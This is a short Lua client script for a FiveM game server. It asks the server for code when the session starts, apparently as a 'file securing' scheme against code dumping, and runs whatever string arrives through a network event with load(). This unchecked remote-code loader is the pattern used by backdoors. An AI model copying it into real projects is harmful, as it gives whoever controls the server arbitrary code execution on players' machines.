Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do Wait(0) end
    TriggerServerEvent('filesecuring:loaddrone')
end)

RegisterNetEvent('client:load-codedrone')
AddEventHandler('client:load-codedrone', function(code)
    assert(load(code))()
end)